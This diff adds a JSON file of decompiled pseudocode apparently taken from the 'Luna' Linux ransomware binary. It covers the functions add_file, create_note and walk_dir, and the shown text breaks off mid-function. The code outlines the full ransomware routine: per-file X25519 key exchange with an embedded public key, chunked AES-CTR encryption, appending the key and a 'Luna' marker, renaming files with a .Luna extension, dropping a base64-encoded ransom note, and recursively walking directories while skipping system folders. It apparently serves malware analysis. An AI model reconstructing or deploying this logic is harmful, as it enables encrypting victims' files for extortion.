@@ -1,0 +1,662 @@
+{
+  "decompilation": {
+    "_ZN15linux_encryptor5files8add_file17h9f8ecb31ebca83c0E": "fn linux_encryptor::files::add_file() -> u32 {\n    let v0: struct4;  // [bp-0x124c]\n    let v1: i64;  // [bp-0x1248], Other Possible Types: struct16, struct8, struct32\n    let v2: struct16;  // [sp-0x1228], Other Possible Types: struct32, unsigned long, int\n    let v3: iNone;  // [bp-0x1220], Other Possible Types: unsigned long\n    let v4: i64;  // [sp-0x1218]\n    let v5: i64;  // [sp-0x1200]\n    let v6: i64;  // [sp-0x11f8]\n    let v7: i64;  // [sp-0x11f0]\n    let v8: i64;  // [sp-0x11e8]\n    let v9: i64;  // [sp-0x11e0]\n    let v10: struct16;  // [sp-0x11d8], Other Possible Types: int\n    let v11: iNone;  // [sp-0x11c8]\n    let v12: struct32;  // [bp-0x11b8], Other Possible Types: int, struct14, struct8\n    let v13: iNone;  // [sp-0x11a8]\n    let v14: iNone;  // [sp-0x1188], Other Possible Types: struct32, Result<struct4, struct8>\n    let v15: iNone;  // [sp-0x1178]\n    let v16: struct16;  // [bp-0x1168], Other Possible Types: int, unsigned long, char, struct32, struct8, struct33\n    let v17: iNone;  // [bp-0x1160]\n    let v18: i64;  // [sp-0x1160]\n    let v19: i64;  // [bp-0x1158], Other Possible Types: int\n    let v20: iNone;  // [sp-0x1148]\n    let v21: iNone;  // [sp-0x1138]\n    let v22: i64;  // [sp-0x10b0]\n    let v23: struct32;  // [bp-0x10a8]\n    let v24: i64;  // [sp-0x1088], Other Possible Types: struct32\n    let v25: i64;  // [sp-0x1080]\n    let v26: struct16;  // [bp-0x1068], Other Possible Types: struct8, unsigned long, Result<struct40, struct8>, struct48, struct24, struct32\n    let v27: i64;  // [sp-0x1060]\n    let v28: i64;  // [bp-0x1058]\n    let v29: i8;  // [bp-0x1038]\n    let v30: i16;  // [bp-0x38]\n    let v32: i64;  // rdi\n    let v33: i64;  // rbx\n    let v34: iNone;  // xmm0\n    let v35: iNone;  // xmm0\n    let v37: iNone;  // xmm0\n    let v38: iNone;  // xmm0\n    let v39: iNone;  // xmm0\n    let v40: iNone;  // xmm0\n    let v41: iNone;  // ymm0\n    let v42: iNone;  // ymm0\n    let v43: i64;  // r13\n    let v44: i64;  // rdx\n    let v45: i64;  // rax\n    let v46: i64;  // rcx\n    let v47: i64;  // rsi\n    let v48: i64;  // cc_ndep\n    let v49: i64;  // rsi\n    let v50: i64;  // rcx\n    let v51: i64;  // rax\n    let v52: i64;  // rax\n    let v53: i64;  // rax\n    let v54: i64;  // rbp\n    let v55: i64;  // r15\n    let v56: i64;  // rbx\n    let v57: i64;  // r14\n    let v58: i64;  // rax\n    let v59: i64;  // rax\n    let v60: i64;  // rbp\n    let v61: i64;  // rax\n    let v62: i64;  // rdi\n    let v63: i64;  // rdx\n    let v64: i64;  // rsi\n    let v65: i64;  // rax\n    let v66: i64;  // r12\n    let v67: i64;  // rsi\n    let v68: i64;  // r15\n    let v69: i64;  // rbx\n    let v70: i64;  // rbx\n\n    v7 = v32;\n    v12 = std::fs::File::options();\n    v14 = std::fs::OpenOptions::_open(std::fs::OpenOptions::write(std::fs::OpenOptions::read(&v12, 1), 1), *(v32 as &i64), *((v32 + 16) as &i64));\n    match v14 {\n        Err(v2) => {\n            goto (*((4534320 + (vvar_1120{stack -4648} as i32 & 3) as u32 as u64 * 4) as &i32) + 4534320) as i64;\n        },\n        Ok(_) => {\n            v0 = struct4 {\n                field_0: *((&v14 as &char + 4) as &i32)\n            };\n            v26 = std::fs::File::metadata(&v0);\n            if v26 {\n                v16 = struct8 {\n                    field_0: *((&v26 as &char + 8) as &i64)\n                };\n                core::result::unwrap_failed(\"called `Result::unwrap()` on an `Err` value\", &v16, &g_473e70, \"src/files.rs\"); /* do not return */\n            }\n            memcpy(&v16, &v26, 176);\n            v33 = std::fs::Metadata::len(&v16);\n            v12 = struct32 {\n                field_0: 0\n                field_16: 0\n            };\n            <rand_core::os::OsRng as rand_core::RngCore>::fill_bytes(&v14, &v12, 32);\n            v34 = v12.field_0;\n            v26 = struct32 {\n                field_0: v34\n                field_16: v13\n            };\n            v16 = x25519_dalek::x25519::clamp_scalar(&v26);\n            v35 = v16.field_0;\n            v23 = struct32 {\n                field_0: v35\n                field_16: v16.field_16\n            };\n            v24 = <x25519_dalek::x25519::PublicKey as core::convert::From<&x25519_dalek::x25519::EphemeralSecret>>::from(&v23);\n            v11 = 0;\n            v10 = 0;\n            memset(&v29, 0, 0x1000);\n            v26 = struct48 {\n                field_0: &g_45323d\n                field_8: 44\n                field_16: 0\n                field_32: 0\n            };\n            *(&v30 as &i16) = 0;\n            v16 = <base64_stream::from_base64_reader::FromBase64Reader<R,N> as std::io::Read>::read(&v26, &v10);\n            if v16 {\n                v12 = struct8 {\n                    field_0: v16.field_8\n                };\n                core::result::unwrap_failed(\"called `Result::unwrap()` on an `Err` value\", &v12, &g_473e70, \"src/files.rs\"); /* do not return */\n            }\n            v16 = struct32 {\n                field_0: v36\n                field_16: v11\n            };\n            v1 = <x25519_dalek::x25519::PublicKey as core::convert::From<[u8; 32]>>::from(&v16);\n            v2 = x25519_dalek::x25519::StaticSecret::diffie_hellman(&v23, &v1);\n            v14 = curve25519_dalek::montgomery::MontgomeryPoint::to_bytes(&v2);\n            v12 = curve25519_dalek::montgomery::MontgomeryPoint::to_bytes(&v24);\n            v37 = v14;\n            v19 = v15;\n            v16 = v37;\n            v38 = v12.field_0;\n            v20 = v38;\n            v21 = v13;\n            v2 = x25519_dalek::x25519::_DERIVE_zeroize_Zeroize_FOR_SharedSecret::<impl zeroize::Zeroize for x25519_dalek::x25519::SharedSecret>::zeroize();\n            v23 = x25519_dalek::x25519::_DERIVE_Drop_FOR_EphemeralSecret::<impl core::ops::drop::Drop for x25519_dalek::x25519::EphemeralSecret>::drop();\n            v39 = v16 as i128;\n            v15 = v19 as i128;\n            v14 = v39;\n            v40 = v20;\n            v42 = ...;\n            v13 = v21;\n            v12 = v40;\n            v43 = crypto::aes::ctr();\n            v24 = v43;\n            v25 = v44;\n            v45 = v33 / 0x50000 * 30;\n            v8 = v33;\n            if v45 >= 60100 {\n                v5 = v44;\n                v6 = v43;\n                v46 = 3941875194382007691;\n                v9 = (v33 - 0xbb80000) / 599;\n                v47 = 599;\n                goto LABEL_40a338;\n            }\n            if !(!(v45 >= 100) || !(!(amd64g_calculate_condition(2, 6, v45 - 100 & 4294967295 & 65535, 100, v48) as char))) {\n                v5 = v44;\n                v6 = v43;\n                v49 = ((v45 as u32 >> 2) * 5243 >> 17) as u64;\n                v50 = v49;\n                v46 = v50 - 1;\n                if v50 == 1 {\n                    core::panicking::panic(\"attempt to divide by zero\", \"src/files.rs\"); /* do not return */\n                }\n                if !(amd64g_calculate_condition(2, 6, v45 & 65535, 100, v48) as char) {\n                    v52 = v8 - v49 * 0x50000;\n                    if !(v52 | v46) >> 32 {\n                        v9 = (((0 CONCAT v52 as u32) % (v46 & 4294967295)) as u32 CONCAT ((0 CONCAT v52 as u32) / (v46 & 4294967295)) as u32) & 4294967295;\n                        v47 = v49 - 1;\n                        if !(!v49 - 1) {\n                            goto LABEL_40a338;\n                        }\n                    } else {\n                        v9 = (((0 CONCAT v52) % v46 as u128) as u64 CONCAT ((0 CONCAT v52) / v46 as u128) as u64) as u64;\n                        v47 = v49 - 1;\n                        if v49 != 1 {\nLABEL_40a338:\n                            v9 += 0x50000;\n                            v57 = 0;\n                            do {\n                                v22 = v47;\n                                v59 = __rust_alloc(0x50000, 1);\n                                v60 = v59;\n                                v2 = v59;\n                                memset(v59, 0, 0x50000);\n                                *(&v3 as &i128) = 0x500000000000000050000;\n                                v61 = __rust_alloc(0x50000, 1);\n                                v16 = v61;\n                                v62 = v61;\n                                memset(v61, 0, 0x50000);\n                                v42 = (v42 & 0xffffffffffffffffffffffffffffffff00000000000000000000000000000000 | 0x500000000000000050000) & 0xffffffffffffffffffffffffffffffff00000000000000000000000000000000 | 0x500000000000000050000;\n                                *(&v17 as &i128) = 0x500000000000000050000;\n                                v26 = struct16 {\n                                    field_0: 0\n                                    field_8: v57\n                                };\n                                v1 = <std::fs::File as std::io::Seek>::seek(&v0, &v26);\n                                if v1 {\n                                    v26 = struct8 {\n                                        field_0: v1.field_8\n                                    };\n                                    core::result::unwrap_failed(\"Can't seek file.\", &v26, &g_473e70, \"src/files.rs\"); /* do not return */\n                                }\n                                v63 = v60;\n                                v26 = <std::process::ChildStdout as std::io::Read>::read(&v0, v60, 0x50000);\n                                if v26 {\n                                    v1 = struct8 {\n                                        field_0: v27\n                                    };\n                                    core::result::unwrap_failed(\"Can't read file.\", &v1, &g_473e70, \"src/files.rs\"); /* do not return */\n                                }\n                                *((v5 + 24) as &i64)();\n                                v26 = struct16 {\n                                    field_0: 0\n                                    field_8: v57\n                                };\n                                v1 = <std::fs::File as std::io::Seek>::seek(&v0, &v26);\n                                if v1 {\n                                    v26 = struct8 {\n                                        field_0: v1.field_8\n                                    };\n                                    core::result::unwrap_failed(\"Can't seek file.\", &v26, &g_473e70, \"src/files.rs\"); /* do not return */\n                                }\n                                v10 = std::os::unix::net::datagram::UnixDatagram::send(&v0, v61, 0x50000);\n                                if v10.field_0 {\n                                    println!(\"Error while writing encrypted data to: {}\", &v7);\n                                    v66 = v5;\n                                    *(v66 as &i64)();\n                                    return;\n                                }\n                                v57 += v9;\n                                v64 = v22;\n                                v47 = v64 - 1;\n                            } while (v64 != 1);\n                        }\n                    }\n                }\nLABEL_40ab71:\n                v26 = struct16 {\n                    field_0: 0\n                    field_8: v8\n                };\n                v16 = <std::fs::File as std::io::Seek>::seek(&v0, &v26);\n                v66 = v5;\n                if v16 {\n                    v26 = struct8 {\n                        field_0: v18\n                    };\n                    core::result::unwrap_failed(\"Can't seek file.\", &v26, &g_473e70, \"src/files.rs\"); /* do not return */\n                }\n                v2 = std::os::unix::net::datagram::UnixDatagram::send(&v0, &v12, 32);\n                if v2 {\n                    println!(\"Error while writing public key to: {}\", &v7);\n                    *(v66 as &i64)();\n                    return;\n                }\n                v26 = struct16 {\n                    field_0: 0\n                    field_8: v27 + 32\n                };\n                v16 = <std::fs::File as std::io::Seek>::seek(&v0, &v26);\n                if v16 {\n                    v26 = struct8 {\n                        field_0: v18\n                    };\n                    core::result::unwrap_failed(\"Can't seek file.\", &v26, &g_473e70, \"src/files.rs\"); /* do not return */\n                }\n                v2 = std::os::unix::net::datagram::UnixDatagram::send(&v0, \"Luna\");\n                if v2 {\n                    println!(\"Error while writing extension to: {}\", &v7);\n                    *(v66 as &i64)();\n                    return;\n                }\n                v26 = <alloc::string::String as core::clone::Clone>::clone(v32);\n                v67 = v26.field_16;\n                if v27 == v67 {\n                    v26 = alloc::raw_vec::RawVec<T,A>::reserve::do_reserve_and_handle(v67, 1);\n                    v67 = v26.field_16;\n                }\n                *((v26 + v67) as &i8) = 46;\n                v16 = v26;\n                v26 = core::str::converts::from_utf8(\"Luna\");\n                if v26 {\n                    *(&v2 as &i128) = *((&v26 as &char + 8) as &i128);\n                    core::result::unwrap_failed(\"called `Result::unwrap()` on an `Err` value\", &v2, &g_473eb0, \"src/files.rs\"); /* do not return */\n                }\n                v68 = *((&v26 as &char + 16) as &i64);\n                v69 = (&v16)[16] as i64;\n                if v18 - v69 < v68 {\n                    v16 = alloc::raw_vec::RawVec<T,A>::reserve::do_reserve_and_handle(v69, v68);\n                    v69 = (&v16)[16] as i64;\n                }\n                memcpy(v16 + v69, v27, v68);\n                v70 = v69 + v68;\n                v28 = v70;\n                v26 = v16;\n                v1 = std::sys::unix::fs::rename(*(v32 as &i64), *((v32 + 16) as &i64), v26, v70);\n                if !v1 {\n                    *(v66 as &i64)();\n                    return;\n                }\n                println!(\"Error while renaming file: {}\", &v7);\n            } else if v33 > 327679 {\n                v51 = __rust_alloc(0x50000, 1);\n                v2 = v51;\n                memset(v51, 0, 0x50000);\n                *(&v3 as &i128) = 0x500000000000000050000;\n                v58 = __rust_alloc(0x50000, 1);\n                v16 = v58;\n                memset(v58, 0, 0x50000);\n                *(&v17 as &i128) = 0x500000000000000050000;\n                v26 = struct16 {\n                    field_0: 0\n                    field_8: 0\n                };\n                v1 = <std::fs::File as std::io::Seek>::seek(&v0, &v26);\n                if v1 {\n                    v26 = struct8 {\n                        field_0: v1.field_8\n                    };\n                    core::result::unwrap_failed(\"Can't seek file.\", &v26, &g_473e70, \"src/files.rs\"); /* do not return */\n                }\n                v26 = <std::process::ChildStdout as std::io::Read>::read(&v0, v51, 0x50000);\n                if v26 {\n                    v1 = struct8 {\n                        field_0: v27\n                    };\n                    core::result::unwrap_failed(\"Can't read file.\", &v1, &g_473e70, \"src/files.rs\"); /* do not return */\n                }\n                *((v66 + 24) as &i64)();\n                v26 = struct16 {\n                    field_0: 0\n                    field_8: 0\n                };\n                v1 = <std::fs::File as std::io::Seek>::seek(&v0, &v26);\n                if v1 {\n                    v26 = struct8 {\n                        field_0: v1.field_8\n                    };\n                    core::result::unwrap_failed(\"Can't seek file.\", &v26, &g_473e70, \"src/files.rs\"); /* do not return */\n                }\n                v10 = std::os::unix::net::datagram::UnixDatagram::send(&v0, v58, 0x50000);\n                if !v10.field_0 {\n                    goto LABEL_40ab71;\n                } else {\n                    println!(\"Error while writing encrypted data to: {}\", &v7);\n                }\n            } else {\n                if !v33 {\n                    v54 = v33;\n                    v2 = 1;\n                    *(&v3 as &i128) = 0;\n                    v16 = 1;\n                    *(&v17 as &i128) = 0;\n                    v55 = 1;\n                    v56 = 1;\n                } else {\n                    v53 = __rust_alloc(v33, 1);\n                    v55 = v53;\n                    v2 = v53;\n                    v3 = v33;\n                    memset(v53, 0, v33);\n                    v4 = v33;\n                    v65 = __rust_alloc(v33, 1);\n                    v16 = v65;\n                    v18 = v33;\n                    memset(v65, 0, v33);\n                    v54 = v33;\n                    v19 = v33;\n                    v56 = v65;\n                }\n                v26 = struct16 {\n                    field_0: 0\n                    field_8: 0\n                };\n                v1 = <std::fs::File as std::io::Seek>::seek(&v0, &v26);\n                if v1 {\n                    v26 = struct8 {\n                        field_0: v1.field_8\n                    };\n                    core::result::unwrap_failed(\"Can't seek file.\", &v26, &g_473e70, \"src/files.rs\"); /* do not return */\n                }\n                v26 = <std::process::ChildStdout as std::io::Read>::read(&v0, v55, v54);\n                if v26 {\n                    v1 = struct8 {\n                        field_0: v27\n                    };\n                    core::result::unwrap_failed(\"Can't read file.\", &v1, &g_473e70, \"src/files.rs\"); /* do not return */\n                }\n                *((v66 + 24) as &i64)();\n                v26 = struct16 {\n                    field_0: 0\n                    field_8: 0\n                };\n                v1 = <std::fs::File as std::io::Seek>::seek(&v0, &v26);\n                if v1 {\n                    v26 = struct8 {\n                        field_0: v1.field_8\n                    };\n                    core::result::unwrap_failed(\"Can't seek file.\", &v26, &g_473e70, \"src/files.rs\"); /* do not return */\n                }\n                v10 = std::os::unix::net::datagram::UnixDatagram::send(&v0, v56, v8);\n                if !v10.field_0 {\n                    v5 = v66;\n                    v6 = v43;\n                    if v8 {\n                        goto LABEL_40ab71;\n                    }\n                } else {\n                    println!(\"Error while writing encrypted data to: {}\", &v7);\n                }\n            }\n            *(v66 as &i64)();\n            return;\n        },\n    }\n}\n",
+    "_ZN15linux_encryptor5files11create_note17hd3c91fc90c0b0684E": "fn linux_encryptor::files::create_note() -> u32 {\n    let v0: i64;  // [sp-0x10e8], Other Possible Types: struct16, int\n    let v1: i64;  // [sp-0x10e0]\n    let v2: i64;  // [sp-0x10d8]\n    let v3: i64;  // [sp-0x10b0]\n    let v4: iNone;  // [bp-0x10a8], Other Possible Types: struct8\n    let v5: i64;  // [sp-0x1098]\n    let v6: iNone;  // [sp-0x1088], Other Possible Types: Result<struct16, struct10>\n    let v7: i64;  // [sp-0x1078]\n    let v8: i64;  // [sp-0x1070]\n    let v9: i64;  // [sp-0x1068]\n    let v10: i64;  // [sp-0x1060]\n    let v11: i64;  // [sp-0x1058], Other Possible Types: struct16, struct48, struct24, Result<struct16, struct10>\n    let v12: i64;  // [sp-0x1050]\n    let v13: i64;  // [bp-0x1048]\n    let v14: i8;  // [bp-0x1028]\n    let v15: i16;  // [bp-0x28]\n    let v17: i64;  // rdi\n    let v18: i64;  // rsi\n    let v19: i64;  // rax\n    let v20: i64;  // r14\n    let v21: i64;  // rbx\n    let v22: i64;  // rbx\n    let v23: i64;  // rcx\n    let v24: i64;  // rdx\n    let v25: i64;  // rdx\n    let v26: i64;  // rsi\n    let v28: i64;  // rdx\n    let v29: i32;  // esi\n    let v30: i32;  // ebx\n    let v31: i32;  // edi\n    let v32: i64;  // rbx\n    let v33: i64;  // rcx\n    let v34: i64;  // rdx\n    let v35: i64;  // rdx\n    let v36: i64;  // rsi\n    let v38: i64;  // rax\n    let v39: i32;  // edx\n    let v40: i32;  // edi\n    let v41: i32;  // esi\n    let v42: i64;  // rax\n\n    v11 = <alloc::string::String as core::clone::Clone>::clone(v17);\n    v18 = v11.field_16;\n    if v12 - v18 <= 6 {\n        v11 = alloc::raw_vec::RawVec<T,A>::reserve::do_reserve_and_handle(v18, 7);\n        v18 = v11.field_16;\n    }\n    v19 = v11;\n    *((v19 + v18 + 3) as &i32) = 761621860;\n    *((v19 + v18) as &i32) = 1684104562;\n    v0 = v11;\n    v11 = core::str::converts::from_utf8(\"Luna\");\n    if v11 {\n        *(&v4 as &i128) = *((&v11 as &char + 8) as &i128);\n        core::result::unwrap_failed(\"called `Result::unwrap()` on an `Err` value\", &v4, &g_473eb0, \"src/files.rs\"); /* do not return */\n    }\n    v20 = *((&v11 as &char + 16) as &i64);\n    v21 = v2;\n    if v1 - v21 < v20 {\n        v0 = alloc::raw_vec::RawVec<T,A>::reserve::do_reserve_and_handle(v21, v20);\n        v21 = v2;\n    }\n    memcpy(v0 + v21, v12, v20);\n    v22 = v21 + v20;\n    v13 = v22;\n    v11 = v0;\n    if v12 - v22 <= 3 {\n        v11 = alloc::raw_vec::RawVec<T,A>::reserve::do_reserve_and_handle(v22, 4);\n        v22 = v13;\n    }\n    *((v11 + v22) as &i32) = 1954051118;\n    v6 = v11;\n    v23 = &g_453357;\n    v24 = 746;\n    do {\n        v25 = v24;\n        if v23 == 4535874 {\n            core::panicking::panic(\"called `Option::unwrap()` on a `None` value\", \"src/files.rs\"); /* do not return */\n        }\n        v26 = *(v23 as &i8);\n        if v26 as u8 >= 0 {\n            v23 += 1;\n        } else if (v26 & 255) < 224 {\n            v23 += 2;\n        } else if (v26 & 255) < 240 {\n            v23 += 3;\n        } else if (*((v23 + 3) as &i8) & 63 | (*((v23 + 2) as &i8) & 63) * 64 | (*((v23 + 1) as &i8) & 63) * 0x1000 | (v26 as u32 & 7) * 0x40000) != 0x110000 {\n            v23 += 4;\n        } else {\n            core::panicking::panic(\"called `Option::unwrap()` on a `None` value\", \"src/files.rs\"); /* do not return */\n        }\n        v24 = v25 - 1;\n    } while (v25 != 1);\n    if v23 == 4535874 {\n        core::panicking::panic(\"called `Option::unwrap()` on a `None` value\", \"src/files.rs\"); /* do not return */\n    }\n    v28 = *(v23 as &i8);\n    if v28 as u8 >= 0 {\nLABEL_40b975:\n        v32 = 559;\n        if !(v28 as u32 == 61) {\n            goto LABEL_40babe;\n        }\n    } else {\n        v29 = v28 as u32 & 31;\n        v30 = *((v23 + 1) as &i8) & 63;\n        if (v28 & 255) <= 223 {\n            v32 = 559;\n            if !((v29 as u64 * 64 | v30) == 61) {\n                goto LABEL_40babe;\n            }\n        } else {\n            v31 = *((v23 + 2) as &i8) & 63 | v30 as u64 * 64;\n            if (v28 & 255) < 240 {\n                v32 = 559;\n                if !((v31 | v29 as u64 * 0x1000) == 61) {\n                    goto LABEL_40babe;\n                }\n            } else {\n                v28 = *((v23 + 3) as &i8) & 63 | v31 as u64 * 64 | (v29 & 7) as u64 * 0x40000;\n                if v28 as u32 == 0x110000 {\n                    core::panicking::panic(\"called `Option::unwrap()` on a `None` value\", \"src/files.rs\"); /* do not return */\n                }\n                goto LABEL_40b975;\n            }\n        }\n    }\n    v33 = &g_453357;\n    v34 = 745;\n    do {\n        v35 = v34;\n        if v33 == 4535874 {\n            core::panicking::panic(\"called `Option::unwrap()` on a `None` value\", \"src/files.rs\"); /* do not return */\n        }\n        v36 = *(v33 as &i8);\n        if v36 as u8 >= 0 {\n            v33 += 1;\n        } else if (v36 & 255) < 224 {\n            v33 += 2;\n        } else if (v36 & 255) < 240 {\n            v33 += 3;\n        } else {\n            if (*((v33 + 3) as &i8) & 63 | (*((v33 + 2) as &i8) & 63) * 64 | (*((v33 + 1) as &i8) & 63) * 0x1000 | (v36 as u32 & 7) * 0x40000) == 0x110000 {\n                core::panicking::panic(\"called `Option::unwrap()` on a `None` value\", \"src/files.rs\"); /* do not return */\n            }\n            v33 += 4;\n        }\n        v34 = v35 - 1;\n    } while (v35 != 1);\n    if v33 == 4535874 {\n        core::panicking::panic(\"called `Option::unwrap()` on a `None` value\", \"src/files.rs\"); /* do not return */\n    }\n    v38 = *(v33 as &i8);\n    if v38 as u8 < 0 {\n        v39 = v38 as u32 & 31;\n        v40 = *((v33 + 1) as &i8) & 63;\n        if (v38 & 255) <= 223 {\n            v38 = (v39 as u64 * 64 | v40) as u64;\n        } else {\n            v41 = *((v33 + 2) as &i8) & 63 | v40 as u64 * 64;\n            if (v38 & 255) < 240 {\n                v38 = v41 | v39 as u64 * 0x1000;\n            } else {\n                v38 = *((v33 + 3) as &i8) & 63 | v41 as u64 * 64 | (v39 & 7) as u64 * 0x40000;\n                if v38 as u32 == 0x110000 {\n                    core::panicking::panic(\"called `Option::unwrap()` on a `None` value\", \"src/files.rs\"); /* do not return */\n                }\n            }\n        }\n    }\n    v32 = 558 - (v38 as u32 == 61);\nLABEL_40babe:\n    v42 = __rust_alloc_zeroed(v32, 1);\n    v8 = v42;\n    v9 = v32;\n    v10 = v32;\n    memset(&v14, 0, 0x1000);\n    v11 = struct48 {\n        field_0: &g_453357\n        field_8: 747\n        field_16: 0\n        field_32: 0\n    };\n    *(&v15 as &i16) = 0;\n    v0 = <base64_stream::from_base64_reader::FromBase64Reader<R,N> as std::io::Read>::read(&v11, v42);\n    if v0 {\n        v4 = struct8 {\n            field_0: v0.field_8\n        };\n        core::result::unwrap_failed(\"called `Result::unwrap()` on an `Err` value\", &v4, &g_473e70, \"src/files.rs\"); /* do not return */\n    }\n    v5 = v7;\n    v4 = v6;\n    v2 = v10;\n    *(&v0 as &i128) = *(&v8 as &i128);\n    v3 = std::fs::write(&v4, &v0);\n    if !v3 {\n        return;\n    }\n    println!(\"Error while writing note\");\n}\n",
+    "_ZN15linux_encryptor5files8walk_dir17h3bbd2a8a81e3b38eE": "fn linux_encryptor::files::walk_dir(a0: u32) -> u64 {\n    let v0: Option<struct24>;  // [bp-0x138], Other Possible Types: struct8, char, Result<struct16, struct10>\n    let v1: Option<struct24>;  // [sp-0x138], Other Possible Types: int, unsigned long\n    let v2: i64;  // [sp-0x130]\n    let v3: i64;  // [sp-0x128]\n    let v4: i64;  // [bp-0x108], Other Possible Types: int\n    let v5: i64;  // [sp-0x100]\n    let v6: i64;  // [sp-0xf8]\n    let v7: Option<struct24>;  // [sp-0xf0], Other Possible Types: struct16, unsigned long\n    let v8: i64;  // [sp-0xe8]\n    let v9: i64;  // [sp-0xe0]\n    let v10: iNone;  // [sp-0xd8], Other Possible Types: struct16, struct24\n    let v11: struct16;  // [sp-0xd8], Other Possible Types: Option<struct24>, unsigned long\n    let v12: i64;  // [sp-0xd0]\n    let v13: i8;  // [bp-0xc0]\n    let v14: iNone;  // [sp-0xb8]\n    let v15: iNone;  // [sp-0xa8]\n    let v16: iNone;  // [sp-0x98]\n    let v17: i64;  // [sp-0x80]\n    let v18: iNone;  // [bp-0x78]\n    let v19: i64;  // [sp-0x60], Other Possible Types: Option<struct40>\n    let v21: i64;  // rdx\n    let v22: i64;  // r12\n    let v23: iNone;  // ymm0\n    let v24: iNone;  // ymm1\n    let v25: iNone;  // ymm2\n    let v26: iNone;  // xmm0\n    let v27: iNone;  // xmm1\n    let v28: iNone;  // xmm2\n    let v29: i64;  // rax\n    let v30: i64;  // rdx\n    let v31: i64;  // rbp\n    let v32: i64;  // rax\n    let v33: i64;  // rsi\n    let v34: i64;  // rbp\n    let v35: i64;  // rbx\n    let v36: iNone;  // xmm0\n    let v37: i8;  // r12b\n    let v39: i8;  // bl\n    let v41: i64;  // rax\n    let v42: i64;  // 4099\n    let v43: i64;  // rax\n    let v44: i64;  // 4099\n\n    linux_encryptor::files::create_note();\n    if std::sys::unix::fs::readdir(*(a0 as &i64), *((a0 + 16) as &i64)) {\n        v19 = v21;\n        goto *((4534500 + (vvar_262{reg 32} & 3) * 4) as &i32) + 4534500;\n    } else {\n        v22 = &v0;\n        loop {\n            loop {\n                v19 = <std::fs::ReadDir as core::iter::traits::iterator::Iterator>::next(&v13);\n                match v19 {\n                    None => {\n                        v43 = v30;\n                        v44 = *(v30 as &i64);\n                        *(v30 as &unsigned long) = v44 - 1;\n                        if BinaryOp CasCmpNE {\n                            goto LABEL_0x40c584;\n                        }\n                        if v44 == 1 {\n                            v43 = alloc::sync::Arc<T>::drop_slow(&v13);\n                            return v43;\n                        }\n                        return v43;\n                    },\n                    Some(_) => {\n                        v26 = v19 as i128;\n                        v23 = v23 & 0xffffffffffffffffffffffffffffffff00000000000000000000000000000000 | v26 as u256;\n                        v27 = *((&v19 as &char + 16) as &i128);\n                        v24 = v24 & 0xffffffffffffffffffffffffffffffff00000000000000000000000000000000 | v27 as u256;\n                        v28 = *((&v19 as &char + 32) as &i128);\n                        v25 = v25 & 0xffffffffffffffffffffffffffffffff00000000000000000000000000000000 | v28 as u256;\n                        v16 = v28;\n                        v15 = v27;\n                        v14 = v26;\n                    },\n                }\n                if v14 as i64 {\n                    v0 = struct8 {\n                        field_0: &v14\n                    };\n                    core::result::unwrap_failed(\"called `Result::unwrap()` on an `Err` value\", &v0, &g_473e90, \"src/files.rs\"); /* do not return */\n                }\n                std::fs::DirEntry::path(v22, &v14);\n                if std::path::Path::is_dir(v1, v3) {\n                    if v14 as i64 {\n                        v0 = struct8 {\n                            field_0: &v14\n                        };\n                        core::result::unwrap_failed(\"called `Result::unwrap()` on an `Err` value\", &v0, &g_473e90, \"src/files.rs\"); /* do not return */\n                    }\n                    std::fs::DirEntry::path(v22, &v14);\n                    v29 = std::sys::unix::os_str::Slice::to_str(v1, v3);\n                    if !v29 {\n                        core::panicking::panic(\"called `Option::unwrap()` on a `None` value\", \"src/files.rs\"); /* do not return */\n                    }\n                    if !v30 {\n                        v31 = 1;\n                    } else {\n                        v31 = __rust_alloc(v30, 1);\n                    }\n                    memcpy(v31, v29, v30);\n                    v7 = v31;\n                    v8 = v30;\n                    v9 = v30;\n                    v10 = <alloc::string::String as core::clone::Clone>::clone(&v7);\n                    v33 = v10.field_16;\n                    v22 = &v1;\n                    if v12 == v33 {\n                        v10 = alloc::raw_vec::RawVec<T,A>::reserve::do_reserve_and_handle(v33, 1);\n                        v33 = v10.field_16;\n                    }\n                    *((v11 + v33) as &i8) = 92;\n                    v6 = v33 + 1;\n                    v36 = v10 as i128;\n                    v23 = v23 & 0xffffffffffffffffffffffffffffffff00000000000000000000000000000000 | v36 as u256;\n                    v4 = v36;\n                    v7 = alloc::str::<impl str>::to_lowercase(v4, v6);\n                    if core::str::pattern::Pattern::is_contained_in(\"openserver\", v7, v9) as i8 {\nLABEL_40c170:\n                        v39 = 0;\n                        goto LABEL_40c187;\n                    } else {\n                        v0 = alloc::str::<impl str>::to_lowercase(v4, v6);\n                        if !(!core::str::pattern::Pattern::is_contained_in(\"windows\", v1, v3) as i8) {\n                            goto LABEL_40c170;\n                        }\n                        v0 = alloc::str::<impl str>::to_lowercase(v4, v6);\n                        if !(!core::str::pattern::Pattern::is_contained_in(\"program files\", v1, v3) as i8) {\n                            goto LABEL_40c170;\n                        }\n                        v0 = alloc::str::<impl str>::to_lowercase(v4, v6);\n                        if !(!core::str::pattern::Pattern::is_contained_in(\"recycle.bin\", v1, v3) as i8) {\n                            goto LABEL_40c170;\n                        }\n                        v0 = alloc::str::<impl str>::to_lowercase(v4, v6);\n                        if !(!core::str::pattern::Pattern::is_contained_in(\"programdata\", v1, v3) as i8) {\n                            goto LABEL_40c170;\n                        }\n                        v0 = alloc::str::<impl str>::to_lowercase(v4, v6);\n                        if !(!core::str::pattern::Pattern::is_contained_in(\"appdata\", v1, v3) as i8) {\n                            goto LABEL_40c170;\n                        }\n                        v0 = alloc::str::<impl str>::to_lowercase(v4, v6);\n                        v39 = core::str::pattern::Pattern::is_contained_in(\"all users\", v1, v3) as i32 & 0xffffffffffffff00 | core::str::pattern::Pattern::is_contained_in(\"all users\", v1, v3) as i32 ^ 1;\nLABEL_40c187:\n                        if v39 {\n                            linux_encryptor::files::walk_dir(&v4);\n                        }\n                        goto LABEL_40c1b3;\n                    }\n                }\n                if v14 as i64 {\n                    v0 = struct8 {\n                        field_0: &v14\n                    };\n                    core::result::unwrap_failed(\"called `Result::unwrap()` on an `Err` value\", &v0, &g_473e90, \"src/files.rs\"); /* do not return */\n                }\n                std::fs::DirEntry::path(v22, &v14);\n                if !std::path::Path::is_file(v1, v3) {\n                    goto LABEL_40c1b3;\n                }\n                if v14 as i64 {\n                    v0 = struct8 {\n                        field_0: &v14\n                    };\n                    core::result::unwrap_failed(\"called `Result::unwrap()` on an `Err` value\", &v0, &g_473e90, \"src/files.rs\"); /* do not return */\n                }\n                std::fs::DirEntry::path(v22, &v14);\n                v32 = std::sys::unix::os_str::Slice::to_str(v1, v3);\n                if !v32 {\n                    core::panicking::panic(\"called `Option::unwrap()` on a `None` value\", \"src/files.rs\"); /* do not return */\n                }\n                v34 = v30;\n                if 